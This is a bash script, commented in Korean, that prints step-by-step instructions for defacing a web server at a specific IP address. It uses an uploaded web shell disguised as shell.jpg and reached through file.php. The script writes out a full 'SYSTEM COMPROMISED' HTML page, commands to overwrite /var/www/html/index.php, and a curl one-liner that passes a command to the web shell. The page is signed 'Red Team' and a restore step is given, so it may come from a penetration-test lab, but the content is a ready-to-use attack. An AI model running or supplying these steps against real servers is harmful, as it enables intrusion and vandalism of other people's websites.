#!/bin/bash
echo "============================================================"
echo "💀 Defacement 페이지 배포"
echo "============================================================"
echo ""
echo "방법 1: 웹쉘을 통한 배포 (권장)"
echo "------------------------------------------------------------"
echo "웹쉘 접속: http://52.78.221.104/file.php?name=shell.jpg"
echo ""
echo "다음 명령 실행:"
echo ""
cat << 'EOF'
# 1. 원본 index.php 백업
cp /var/www/html/index.php /var/www/html/index.php.bak

# 2. defacement.html 생성
cat > /tmp/defacement.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HACKED</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container { text-align: center; animation: glitch 1s infinite; }
        .skull {
            font-size: 12px;
            line-height: 1.2;
            white-space: pre;
            text-shadow: 0 0 10px #0f0;
        }
        h1 {
            font-size: 4em;
            margin: 30px 0;
            text-shadow: 0 0 20px #f00, 0 0 40px #f00;
            animation: blink 0.5s infinite;
            color: #f00;
        }
        .message { font-size: 1.5em; margin: 20px 0; text-shadow: 0 0 10px #0f0; }
        .info { font-size: 1em; margin-top: 30px; opacity: 0.8; }
        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0.3; }
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        .matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; z-index: -1; }
    </style>
</head>
<body>
    <canvas class="matrix"></canvas>
    <div class="container">
        <div class="skull">
                       _.--""-._
                    ."         ".
                   /             \
                  |               |
                  |,  .-.  .-.  ,|
                  | )(__/  \__)( |
                  |/     /\     \|
        (@_       (_     ^^     _)
           \_/|_____|\__________/|
              \______/  \______/  \
             .'   _..|..  .._   '.
            /    /  ___\___  \    \
           /    /  / _ \/ _ \  \    \
          /    /  / /_\ /_\ \  \    \
         /    /  / _    _   \  \    \
        /    /  / / \  / \   \  \    \
       /    /  / /   \/   \   \  \    \
      /____/  /_/          \_\ \____\
        </div>
        <h1>SYSTEM COMPROMISED</h1>
        <div class="message">
            > Your system has been penetrated<br>
            > All vulnerabilities exploited<br>
            > Data has been exfiltrated<br>
        </div>
        <div class="info">
            [ SQL Injection: BYPASSED ]<br>
            [ File Upload: EXPLOITED ]<br>
            [ XSS: INJECTED ]<br>
            [ CSRF: EXECUTED ]<br>
            [ Database: COMPROMISED ]<br>
            [ Session: HIJACKED ]<br>
            <br>
            PENETRATION TEST SUCCESSFUL<br>
            <br>
            -- Red Team --
        </div>
    </div>
    <script>
        const canvas = document.querySelector('.matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%";
        const fontSize = 10;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) { drops[i] = 1; }
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = matrix[Math.floor(Math.random() * matrix.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(draw, 35);
        setInterval(() => {
            document.body.style.filter = 'hue-rotate(' + Math.random() * 360 + 'deg)';
            setTimeout(() => { document.body.style.filter = 'none'; }, 50);
        }, 3000);
    </script>
</body>
</html>
HTMLEOF

# 3. index.php 덮어쓰기
cp /tmp/defacement.html /var/www/html/index.php

# 4. 확인
ls -la /var/www/html/index.php
EOF

echo ""
echo "============================================================"
echo ""
echo "방법 2: curl을 통한 배포"
echo "------------------------------------------------------------"
echo "curl 'http://52.78.221.104/file.php?name=shell.jpg&cmd=cp%20/tmp/defacement.html%20/var/www/html/index.php'"
echo ""
echo "============================================================"
echo ""
echo "복구 방법:"
echo "------------------------------------------------------------"
echo "# 웹쉘에서"
echo "cp /var/www/html/index.php.bak /var/www/html/index.php"
echo ""
echo "============================================================"
echo ""
echo "확인:"
echo "------------------------------------------------------------"
echo "브라우저에서 http://52.78.221.104/ 접속"
echo "→ 해골과 HACKED 메시지 표시"
echo ""
echo "============================================================"
